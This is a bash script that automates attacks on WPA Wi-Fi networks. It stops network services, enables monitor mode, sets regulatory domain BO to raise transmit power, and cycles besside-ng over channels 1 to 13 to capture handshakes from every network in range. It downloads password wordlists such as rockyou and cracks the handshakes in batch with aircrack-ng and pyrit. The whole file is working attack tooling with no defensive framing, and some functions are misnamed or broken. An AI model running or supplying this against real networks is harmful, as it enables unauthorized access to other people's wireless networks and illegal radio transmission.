#!/bin/bash
WLAN_IFACE=wlan0
MON_IFACE=mon0
WORDLISTS="~/wordlists/"


function prepare_monitor_device {
		/etc/init.d/network-manager stop
		/etc/init.d/networking stop
		/etc/init.d/avahi-daemon stop
		/etc/init.d/wicd stop
		airmon-ng stop mon0
		
		airmon-ng check kill
		sleep 15
		airmon-ng check kill
		sleep 5
		airmon-ng start $WLAN_IFACE
		
		ifconfig $MON_IFACE down
		iw reg set BO 
		ifconfig $MON_IFACE up
		iwconfig $MON_IFACE channel 13
		iwconfig $MON_IFACE txpower 30
	
	}
	
function scan_targets {
		airodump-ng  --berlin 25 --manufacturer  -w airdump/dump mon0 &
		sleep 3
		killall -15 airodump-ng
	}
		
function get_handshakes {
	prepare_monitor_device
	iter=1

	rm besside.log
	while [ $iter -lt 14 ] ; do 
		besside-ng -c $iter mon0 &
		sleep 60
		killall -15 besside-ng
		sleep 3
		killall -9 besside-ng 
		iter=$(( 1 + $iter ))
		
		if [ $iter -eq 14 ]
			then
		iter=1
		fi
	done
}

function gen_target_list {
		pyrit -r wpa.cap analyze|grep AccessPoint | cut -d "'" -f 2 > ap_list
		pyrit -r wpa.cap analyze|grep AccessPoint | cut -d " " -f 3 > bssid_list
	}
	
function pyrit_create_essids {
	readarray -t ap_array < ap_list

	for ap_essid in ${ap_array[@]}
	do :
		echo "Creating ESSID $ap_essid"
		pyrit -e $ap_essid create_essid
	done
}

function pyrit_attack_bssids {
	readarray -t ap_bssid_array < bssid_list
	
	for ap_bssid in ${ap_bssid_array[@]}
	do :
		pyrit -b $ap_bssid -r wpa.cap -o $ap_bssid --all-handshakes attack_batch
	done
}


function install_dependencies {
	apt-get update
	apt-get -y upgrade
	apt-get -y install pyrit aircrack-ng reaver
	
	if [ ! -d $WORDLISTS ]
	then
		echo "wordlist directory is missing creating it now" 
		mkdir ~/wordlists
		
		echo "Downloading wordlists"
		cd $WORDLISTS
		wget http://sec.stanev.org/dict/hashes_org.txt.gz
		gunzip hashes_org.txt.gz
		rm -f hashes_org.txt.gz
		wget http://sec.stanev.org/dict/os.txt.gz
		gunzip os.txt.gz
		rm -f os.txt.gz
		wget http://sec.stanev.org/dict/used.txt.gz
		gunzip used.txt.gz
		rm -f used.txt.gz
		wget http://sec.stanev.org/dict/wp_de.txt.gz
		gunzip wp_de.txt.gz
		rm -f wp_de.txt.gz
		wget http://sec.stanev.org/dict/wp.txt.gz
		gunzip wp.txt.gz
		rm -f wp.txt.gz
		wget http://sec.stanev.org/dict/insidepro.txt.gz
		gunzip insidepro.txt.gz
		rm -f insidepro.txt.gz
		wget http://sec.stanev.org/dict/openwall.txt.gz
		gunzip openwall.txt.gz
		rm -f openwall.txt.gz
		
		wget -c http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
		bzip2 -d rockyou.txt.bz2
		rm -f rockyou.txt.bz2
		wget http://downloads.skullsecurity.org/passwords/german.txt.bz2
		bzip2 -d german.txt.bz2
		rm -f german.txt.bz2
fi

}

function aircrack_batch {
	
	gen_target_list

	#cracking the wpa handshake with wordliststs
	#wordlists are ordered by size 
	
	ls -r -1 -S ./wordlists/ > listsfile
	readarray lists < listsfile
	
	readarray bssids < bssid_list
	
#	echo "<xml> " > sessionfile.xml

	for list in "${lists[@]}"
	do
	   : 
	   
		echo "<wordlist>$lists</wordlist>" >> sessionfile.xml
		for bssid in "${bssids[@]}"
		do
			: 
		echo "cracking"+$bssid+" with wordlist"+$list
		aircrack-ng -w "wordlists/"$list -b $bssid -q -l $bssid wpa.cap
		echo "<bssid>$bssid</bssid>" >> sessionfile.xml
		done
	done
}


if [ $UID -ne 0 ]
	then
	echo "Error: You need to be root.."
	exit 1
fi
	
	
case "$1" in
  prepare)
	prepare_monitor_device
	;;
  aircrack_all)
	aircrack_batch
	;;
  get_handshakes)
	get_handshakes
	;;
  pyrit_create)
	pyrit_create_essids	
	;;
  pyrit_attack)
	attack_bssids
	;;
  *)
	echo "Usage: $SCRIPTNAME {get_handshakes|pyrit_create_essids|pyrit_attack}" >&2
	exit 3
	;;
esac
